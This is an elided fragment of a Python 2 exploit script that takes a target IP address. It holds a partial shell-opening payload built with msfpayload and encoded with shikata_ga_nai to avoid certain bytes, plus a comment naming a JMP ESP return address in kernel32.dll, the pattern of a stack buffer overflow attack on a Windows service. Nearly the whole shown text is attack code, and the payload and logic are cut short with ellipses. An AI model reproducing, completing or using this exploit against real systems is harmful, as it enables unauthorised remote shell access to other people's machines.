...
if len(sys.argv) < 2:
	...
	print "[-] For excmple [filename.py 192.168.1.10 PWND] would do the trick."
...
if len(sys.argv) > 2:
	platform = sys.argv[2]
	#./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikata_ga_nai -b "\x00\xff\x0d\x3d\x20"
	...
	shellcode = ("\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9"
			...
			"\xba\x1e\x53\x31")
	#7CB74413 FFE4 JMP ESP kernel32.dll
